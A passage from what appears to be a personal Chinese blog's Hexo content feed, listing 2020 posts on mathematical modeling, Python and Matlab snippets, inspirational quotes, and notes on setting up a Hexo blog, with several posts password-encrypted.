8501e8c9c3b2881f0a742cf966abeda5fae16c253efaaa2ecfdb532bdb119c78f0b853a89b1984f96973439645f3b1f2df7c2434a4f1073ab12ef420f09df4901aa3b495d96f4073b0aa1e2bdc48fd63f626c3a99d76b03f6646dcc3fc5a972c7ef9de16bf9a5c9cff076914eb76ba3c793c80a8d07cbec127b16438d36565233ae1b47c7b9e468033bf8e5e3a73333c0cf23147692a3cf43bb833c0d9ac54c45141c43a6e5b06b8a05727e1147944741faf9f9f16f35fc7a3e1b85566e6b1212616940c3db8f590fd7e732250bb201b7fa26bbac8b57</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sklearn-Draws-in-authority-Examples</title>
      <link href="/2020/Sklearn-Draws-in-authority-Examples/"/>
      <url>/2020/Sklearn-Draws-in-authority-Examples/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b9eac2f808a972ab0c59e0de20c0ce315c312a7217c7ce5b3045cdc0968752f2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绘图 </tag>
            
            <tag> sklearn </tag>
            
            <tag> 评价指标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beautiful-Powerful-Sentences</title>
      <link href="/2020/Beautiful-Powerful-Sentences/"/>
      <url>/2020/Beautiful-Powerful-Sentences/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>从现在起，我开始谨慎地选择我的生活，<br>我不再轻易让自己迷失在各种诱惑里。<br>我心中已经听到来自远方的呼唤，<br>再不需要回过头去关心身后的种种是非与议论。<br>我已无暇顾及过去，我要向前走。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>人最终决定着自己的命运。<br>在天赋和环境内，他成为什么是自己决定的结果。<br>人不是简单的活着，而是时时需求对自己的前途做出思考，<br>决定下一刻自己会成为什么样的人。<br>每个人都有随时改变自己决定的自由。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>其实你今天经历的，并无特例，所有人都曾经历过。<br>今天的马云、李彦宏、俞敏洪都曾是和你一样的青年，<br>站在人生路口，困惑、孤独，但是充满梦想与希望。<br>不要让害怕本身阻碍了你前进的步伐，不要放大自己的弱点。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>你不必非常出色，只要在很长，很长的时间内保持比别人聪明一点点就够了。<br>–芒格</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>《乌合之众》中有一个观点：“群体不善于推理，却急于采取行动。”<br>前几天的西外喊楼事件，确实，校方做法让学生忍无可忍，但随即西安众多二本院校相继“暴乱”，引以为傲谓之“起义”，谬也，谬也。</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1601114144972-fe954154-6eca-493d-b61a-4b86e6161c6c.png#align=left&display=inline&height=544&name=image.png&originHeight=680&originWidth=350&size=239725&status=done&style=none&width=280" alt="image.png"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>有一个原则你们一定要记住，因为兴趣和感情相聚的人，最好不要牵扯利益；因为利益相识的人，最好也不要谈感情。</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p>《琅琊榜》里萧景睿说过一句话：“我之所以这么待你，是因为我愿意。若能以此换回同样的诚心，固然可喜。若是没有，我也没有什么可后悔的。”<br>你觉得别人应该对你的善意抱有感动，大概是因为你的善意感动了自己，也希望它能感动别人。可是当它并不能感动到别人的时候，也不需要太难过，毕竟它还是感动着你自己。 善意的累积，必定会换到真心，就算不能，也一定会让你心里熨贴，交到知己。<br>–转自知乎</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难。</p><p>人就在转瞬之间感悟，进退得失，不离不弃也就都有了答案。</p><p>我不知道命运会把我带向何方，<br>但是我一直会用善良维护左右。</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>我愿探索不同的视角，<br>永远追逐善良，美好和爱</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>生活虽然可能荆棘满地，但仍然不能阻止你一路高歌。</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>愿你我一路繁花似锦，山水相拥，青山为伴。</p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>把酒祝东风，且共从容。</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p>纵身跃入岁月的长河，从中去寻找自己的意义。</p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p>所有人都祝你快乐，我只愿你，遍历山河，觉得人间值得。</p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p>月色微醺，比是比不过太阳。<br>不过，<br>只要照得亮前路。就耽误不了你的行程。</p><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p>春水碧于天，画船听雨眠。</p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><p>那些真正喜欢的人和事，都值得我们去坚持。</p><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><p>今夕何夕，见此良人。</p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><p>即使是为了专门的目的读书，也要在读书时抛掉其他功利性的想法，沉浸于获得知识的愉悦中。因为结果我们无法决定，但是过程中获得的知识与体验是肯定的。</p><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><p>在这条路上行走过的足迹，那些坚持梦想为梦想而呼吸的曾经，探索的光芒永远印刻在心里，变成一种理想温暖依旧永垂不朽。</p>]]></content>
      
      
      <categories>
          
          <category> 文艺 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文艺 </tag>
            
            <tag> 句子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-common-python-operations-2</title>
      <link href="/2020/Summary-of-common-python-operations-2/"/>
      <url>/2020/Summary-of-common-python-operations-2/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="002793e7456b0ce50ef1cbefbb2e92c64604f36f2ad6414ae6f958d3cbbdce51"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> python </tag>
            
            <tag> 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-draw-map</title>
      <link href="/2020/python-draw-map/"/>
      <url>/2020/python-draw-map/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="相关示例"><a href="#相关示例" class="headerlink" title="相关示例"></a>相关示例</h1><p><a href="https://blog.csdn.net/weixin_43820992/article/details/86725737?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.channel_param">地图代码</a><br><a href="https://www.analyticsvidhya.com/blog/2020/06/guide-geospatial-analysis-folium-python/">时间热力图</a><br>官方示例 <a href="https://nbviewer.jupyter.org/github/python-visualization/folium/blob/master/examples/Heatmap.ipynb">https://nbviewer.jupyter.org/github/python-visualization/folium/blob/master/examples/Heatmap.ipynb</a></p><h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p><a href="http://datav.aliyun.com/tools/atlas/#%E2%AA%AB=31.80289258670676&lng=104.2822265625&zoom=4">http://datav.aliyun.com/tools/atlas/#⪫=31.80289258670676&amp;lng=104.2822265625&amp;zoom=4</a><br>直接下载</p>]]></content>
      
      
      <categories>
          
          <category> 绘图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 地图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms-of-codes-in-Mathematical-Modeling</title>
      <link href="/2020/Algorithms-of-codes-in-Mathematical-Modeling/"/>
      <url>/2020/Algorithms-of-codes-in-Mathematical-Modeling/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="86909465d1c4a6ff4ba16760d7d39cf4f64cc0dfb6ef4b7bbcbc5cb48207690b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Details-that-are-probably-Overlooked</title>
      <link href="/2020/Details-that-are-probably-Overlooked/"/>
      <url>/2020/Details-that-are-probably-Overlooked/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="38d880fd2e150511a52add10632c6d51dda3a16576cdd63f3bcc646e41c3898a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> 灵敏性分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple-ppt-Templates</title>
      <link href="/2020/Simple-ppt-Templates/"/>
      <url>/2020/Simple-ppt-Templates/</url>
      
        <content type="html"><![CDATA[<p>收集的一些简洁且美观的 ppt 模板样式。</p><a id="more"></a><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599053596739-2619f683-de73-4e01-bb6e-4666142b411d.png#align=left&display=inline&height=292&name=image.png&originHeight=583&originWidth=975&size=151805&status=done&style=none&width=487.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599053631577-62d03623-0c5a-4577-9ab6-cdf5e8720d3a.png#align=left&display=inline&height=219&name=image.png&originHeight=437&originWidth=927&size=44029&status=done&style=none&width=463.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599053653363-3474a62c-c56b-4202-ae04-3a16193fb53e.png#align=left&display=inline&height=294&name=image.png&originHeight=587&originWidth=1033&size=187025&status=done&style=none&width=516.5" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ppt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Common-operations-in-Matlab-and-Python</title>
      <link href="/2020/Common-operations-in-Matlab-and-Python/"/>
      <url>/2020/Common-operations-in-Matlab-and-Python/</url>
      
        <content type="html"><![CDATA[<p>记录一下常用命令</p><a id="more"></a><h1 id="Matlab"><a href="#Matlab" class="headerlink" title="Matlab"></a>Matlab</h1><h1 id="读取-xlsx"><a href="#读取-xlsx" class="headerlink" title="读取 xlsx"></a>读取 xlsx</h1><p><code>data = xlsread(&#39;CUMCM2016-C-Appendix-Chinese.xlsx&#39;,1);</code></p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="读数据集文件"><a href="#读数据集文件" class="headerlink" title="读数据集文件"></a>读数据集文件</h2><p><code>data = pd.read_excel(io=&#39;/content/drive/My Drive/Colab Notebooks/CUMCM2016-C-Appendix-Chinese.xlsx&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scipy.io <span class="hljs-keyword">as</span> scio<br><br>path = <span class="hljs-string">&#x27;ex3data1.mat&#x27;</span><br>data = scio.loadmat(path)<br></code></pre></td></tr></table></figure><h2 id="修改-DataFrame-列名"><a href="#修改-DataFrame-列名" class="headerlink" title="修改 DataFrame 列名"></a>修改 DataFrame 列名</h2><p><code>data.columns = [&#39;t&#39;,&#39;20A&#39;,&#39;30A&#39;,&#39;40A&#39;,&#39;50A&#39;,&#39;60A&#39;,&#39;70A&#39;,&#39;80A&#39;,&#39;90A&#39;,&#39;100A&#39;,&#39;&#39;,&#39;&#39;]</code><br>直接修改它的 columns 属性即可。</p><h2 id="删除-DataFrame-列或行"><a href="#删除-DataFrame-列或行" class="headerlink" title="删除 DataFrame 列或行"></a>删除 DataFrame 列或行</h2><p><code>data.drop(data.index[0], inplace=True)#删除行</code><br><code>data.drop(data.columns[10:], axis=1, inplace=True)  # 删除后两列</code></p><h2 id="保存数据到-xlsx"><a href="#保存数据到-xlsx" class="headerlink" title="保存数据到 xlsx"></a>保存数据到 xlsx</h2><p><code>feature_dict_df.to_excel(&#39;/content/drive/My Drive/spss_data.xlsx&#39;,index=False,header=False)</code></p><h2 id="设置图片坐标轴信息"><a href="#设置图片坐标轴信息" class="headerlink" title="设置图片坐标轴信息"></a>设置图片坐标轴信息</h2><p><code>ax1.set_title(&#39;Voltage vs. time&#39;,fontsize = 14)</code><br><code>ax1.set_xlabel(&#39;U/v&#39;,fontsize=12)</code><br><code>ax1.set_ylabel(&#39;t/min&#39;,fontsize=12)</code></p><h2 id="保存图片"><a href="#保存图片" class="headerlink" title="保存图片"></a>保存图片</h2><p><code>plt.savefig(&#39;problem3&#39;,dpi=400)#高质量保存</code></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> python </tag>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interpolation-and-fitting</title>
      <link href="/2020/Interpolation-and-fitting/"/>
      <url>/2020/Interpolation-and-fitting/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d5299ebf8cdf5625c59fc4df1bb6749615e1d6a2b261715e79fdcf93d6a2009f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> python </tag>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detailed-description-of-multiple-drawing-functions-in-seaborn</title>
      <link href="/2020/Detailed-description-of-multiple-drawing-functions-in-seaborn/"/>
      <url>/2020/Detailed-description-of-multiple-drawing-functions-in-seaborn/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="737edadd5ed5972300cbfa510bc114d05ceb430854e5c609dab85b00d75cdf75"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 绘图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> seaborn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Operational-Research-in-Mathematical-Modeling</title>
      <link href="/2020/Operational-Research-in-Mathematical-Modeling/"/>
      <url>/2020/Operational-Research-in-Mathematical-Modeling/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9b1c534c47b19b3d7031c3e2757ccf98f6cca03f9ddba8490762861ac70ebcdc"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
            <tag> 运筹学 </tag>
            
            <tag> 局部优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github-action-Integrate-External-chain-conversion</title>
      <link href="/2020/Github-action-Integrate-External-chain-conversion/"/>
      <url>/2020/Github-action-Integrate-External-chain-conversion/</url>
      
        <content type="html"><![CDATA[<p>这是一次耗时 6 个小时，尝试了 99+次的成果。</p><a id="more"></a><h1 id="外链转换"><a href="#外链转换" class="headerlink" title="外链转换"></a>外链转换</h1><p>对于防盗链功能开启的图片链接，在非可信域下是无法加载的。<br>一个简单的临时解决方案是在 post.pug 模板文件中添加 no-referrence 标签，但这会导致文章阅读量出现显示问题。</p><blockquote><p>我不知道为啥会出现这种 bug</p></blockquote><p>作为一个<del>完美主义者</del>我怎么能忍呢是不是。我在项目作者的 issue 下留了言，他说暂时没有考虑，可以我们在 adapter 层做拓展。我看了一下 js 代码，发现我并不会写啊啊啊啊。然后就萌生了用 python 作为外链转换脚本语言，并放弃了向原作者 pull 的想法。<br>我原先在本地已经写好了一个外链转换的脚本，是对于特定文件夹和其他外链转换成我个人又拍云的外链的脚本。我一开始心想这还不简单，直接把脚本中的保存路径改一下，然后改一下正则匹配不就 ok 了吗。但事实狠狠的打脸。</p><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol><li>python2 不支持 urllib？雾<ol><li>替换成 urllib3 并使用 urllib3.PoolManager 创建连接池，进行外链下载</li></ol></li><li>python3.7 不支持 upyun?雾<ol><li>真的坑，由于不能选择 python 版本，导致很多奇奇怪怪的 bug</li></ol></li><li>linux 下中文是乱码的（或者是 ascii 编码，无法用 os.open 中的 encoding 转换成 utf8,而且无法读取中文文件名)<blockquote><p>可能是我姿势不对？</p></blockquote></li></ol><p>a. 解决方法<br>使用英文命名该文件，并使用英文作为文章题目。<br>内部读取文件使用 io.open 并进行编码转换</p><ol start="4"><li>去除外链锚点#符号</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 踩坑 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mathematical-modeling-national-competition-drawing-tips</title>
      <link href="/2020/Mathematical-modeling-national-competition-drawing-tips/"/>
      <url>/2020/Mathematical-modeling-national-competition-drawing-tips/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e227dd57c00111e009e6d3f13dcc2994118bd5c4fa3ab6f261d38184b4051cbb"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 绘图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> python </tag>
            
            <tag> seaborn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Title</title>
      <link href="/2020/Title/"/>
      <url>/2020/Title/</url>
      
        <content type="html"><![CDATA[<p>something</p><a id="more"></a><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo-rebuilding-records</title>
      <link href="/2020/hexo-rebuilding-records/"/>
      <url>/2020/hexo-rebuilding-records/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="hexo-init-报错"><a href="#hexo-init-报错" class="headerlink" title="hexo init 报错"></a>hexo init 报错</h1><p>是由于无法 ping 通 github.com<br>其实我挂了梯子，但是没有想到学校的网络依旧不能连接通，导致一度以为电脑又出了什么问题。<br>然后我在 ip 网站查到了 github 现在的 ip 解析，然后挑了其中能 ping 通的修改了 host 文件。然后结果还是不行。（或许可以，但是我不知道什么时候好的）<br>然后我就直接在 hexo-starter 那个项目里 git clone 了（因为对比发现是一模一样的）</p><h1 id="hexo-安装-theme"><a href="#hexo-安装-theme" class="headerlink" title="hexo 安装 theme"></a>hexo 安装 theme</h1><p>从 git 仓库中下载<br><a href="https://chenzkun.top/page/2/">https://chenzkun.top/page/2/</a><br><a href="https://blog.flexiston.com/">https://blog.flexiston.com/</a><br>这两位的主题我比较中意，我先挑 butterfly 试一试</p><h1 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a>hexo g</h1><p>下载好 theme 后，需要 hexo g 生成预览<br>（网上教程直接就 hexo s，又走了很多弯路）</p><h1 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a>hexo s</h1><p>预览报错<br>Hexo 启动页面显示 extends includes/layout.pug block content include includes/recent-posts.pug include<br>解决方案<br>npm install –save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive<br>清除缓存<br><code>hexo clean</code><br>生成静态文件即可<br><code>hexo g</code></p><h1 id="butterfly-特别语法"><a href="#butterfly-特别语法" class="headerlink" title="butterfly 特别语法"></a>butterfly 特别语法</h1><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% note default %&#125;<br>default 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note primary no-icon %&#125;<br>primary 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note success %&#125;<br>success 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note info %&#125;<br>info 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note warning %&#125;<br>warning 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note danger %&#125;<br>danger 提示塊標籤<br>&#123;% endnote %&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1598349893511-da6c9788-2397-49c6-beb7-bd4c1d7a9b65.png#align=left&display=inline&height=323&name=image.png&originHeight=646&originWidth=722&size=44261&status=done&style=none&width=361" alt="image.png"></p><div class="note note-primary no-icon">            <p>primary 提示塊標籤</p>          </div><p>##</p><h2 id="Gallery-相册图库"><a href="#Gallery-相册图库" class="headerlink" title="Gallery 相册图库"></a>Gallery 相册图库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;div class=&quot;gallery-group-main&quot;&gt;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&lt;/div&gt;<br>name：图库名字。<br>description：图库描述。<br>link：连接到对应相册的地址。<br>img-url：图库封面的地址。<br>例如<br>&lt;div class=&quot;gallery-group-main&quot;&gt;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;壁紙&#x27;</span> <span class="hljs-string">&#x27;收藏的一些壁紙&#x27;</span> <span class="hljs-string">&#x27;/Gallery/wallpaper&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">11</span>/<span class="hljs-number">10</span>/T7Mu8Aod3egmC4Q.png %&#125;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;漫威&#x27;</span> <span class="hljs-string">&#x27;關於漫威的圖片&#x27;</span> <span class="hljs-string">&#x27;/Gallery/marvel&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">8</span>t97aVlp4hgyBGu.jpg %&#125;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;OH MY GIRL&#x27;</span> <span class="hljs-string">&#x27;關於OH MY GIRL的圖片&#x27;</span> <span class="hljs-string">&#x27;/Gallery/ohmygirl&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/hOqbQ3BIwa6KWpo.jpg %&#125;<br>&lt;/div&gt;<br>区别于旧版的 Gallery 相册，新的 Gallery 相册会自动根据图片长度进行排版，书写也更加方便，与 markdown 格式一样。 可根据需要插入到相应的 md。<br>&#123;% gallery %&#125;<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/Fze9jchtnyJXMHN.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/ryLVePaqkYm4TEK.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/gEy5Zc1Ai6VuO4N.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/d6QHbytlSYO4FBG.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">6</span>nepIJ1xTgufatZ.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/E7Jvr4eIPwUNmzq.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/mh19anwBSWIkGlH.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2</span>tu9JC8ewpBFagv.jpg)<br>&#123;% endgallery %&#125;<br></code></pre></td></tr></table></figure><h2 id="tag-hide"><a href="#tag-hide" class="headerlink" title="tag-hide"></a>tag-hide</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1598350154682-2e6da418-722f-46c4-aa74-dbeaabfc3551.png#align=left&display=inline&height=419&name=image.png&originHeight=837&originWidth=1072&size=55521&status=done&style=none&width=536" alt="image.png"></p><h2 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1598350214480-8f0d0d59-09b4-4548-9d71-6d5d768d1168.png#align=left&display=inline&height=322&name=image.png&originHeight=643&originWidth=691&size=26687&status=done&style=none&width=345.5" alt="image.png"></p><h1 id="theme-文件夹无法-git-push"><a href="#theme-文件夹无法-git-push" class="headerlink" title="theme 文件夹无法 git push"></a>theme 文件夹无法 git push</h1><p><img 